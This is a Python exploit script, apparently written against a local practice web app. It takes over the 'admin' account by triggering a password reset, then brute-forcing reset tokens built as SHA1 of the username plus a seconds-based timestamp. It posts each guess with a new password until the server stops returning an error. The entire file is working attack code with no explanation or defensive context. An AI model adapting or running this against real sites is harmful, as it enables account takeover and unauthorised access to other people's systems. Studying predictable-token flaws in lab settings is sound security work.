import hashlib
import datetime
import requests

current_time = datetime.datetime.now()

timestamp1 = current_time.second - 5
print("///////////////////////////////////////////////////////")
print(timestamp1)
print("///////////////////////////////////////////////////////")

url = "http://localhost:5000/passwordForget"
payload = {'username': "admin"}
requests.post(url, data=payload)

timestamp2 = current_time.second + 5
print("///////////////////////////////////////////////////////")
print(timestamp2)
print("///////////////////////////////////////////////////////")


for x in range(timestamp1, timestamp2): 
    print("///////////////////////////////////////////////////////")
    print(x)
    print("///////////////////////////////////////////////////////")

    injection = "admin"+str(x)
    try_injection = hashlib.sha1(injection.encode('utf-8')).hexdigest()
    print(try_injection)
    url = "http://localhost:5000/reset"
    payload = {'resetToken': try_injection, 'password': "Welkom00!", 'username': "admin"}
    response = requests.post(url, data=payload)
    if not "400 ERROR" in response.text:
        print(r"""

                               ._ o o
                               \_`-)|_
                            ,""       \ 
                          ,"  ## |   ಠ ಠ. 
                        ," ##   ,-\__    `.
                      ,"       /     `--._;)
                    ,"     ## /
                  ,"   ##    /


            """)
        break
